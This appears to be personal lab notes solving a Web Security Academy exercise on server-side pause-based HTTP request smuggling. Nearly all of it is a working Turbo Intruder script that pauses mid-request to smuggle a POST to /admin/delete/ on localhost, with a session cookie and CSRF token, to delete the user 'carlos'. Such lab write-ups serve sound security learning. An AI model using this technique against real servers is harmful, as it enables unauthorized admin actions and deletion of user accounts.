# EXPERT: Server-side pause-based request smuggling

My guy Jarno does his magic again https://www.youtube.com/watch?v=AqxKrADAJOE&t=668s

Turbo Intruder script:

```jsx
def queueRequests(target, _):
    engine = RequestEngine(endpoint="https://0ac0005d044399bf8001ad35008f00ba.web-security-academy.net:443",
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False
                           )
    
    # attack request
    attack_request = """POST /resources HTTP/1.1
Host: 0ac0005d044399bf8001ad35008f00ba.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: %s

%s"""

    # smuggled request GET
#    smuggled_request = """GET /admin/ HTTP/1.1
#Host: localhost
#
#"""

    # smuggled request POST
    smuggled_request = """POST /admin/delete/ HTTP/1.1
Content-Length: 53
Cookie: session=PTl9GXzX10PmH21S5fAPtiAafInysIuz
Host: localhost

csrf=GKw6UIc1Xh87n0GMh6uCCgaduXtbowAd&username=carlos

"""

    # normal request
    normal_request = """GET / HTTP/1.1
Host: 0ac0005d044399bf8001ad35008f00ba.web-security-academy.net

"""
    engine.queue(attack_request, [len(smuggled_request), smuggled_request], pauseMarker=['\r\n\r\nPOST'], pauseTime=61000)
    engine.queue(normal_request)

def handleResponse(req, _):
    table.add(req)
```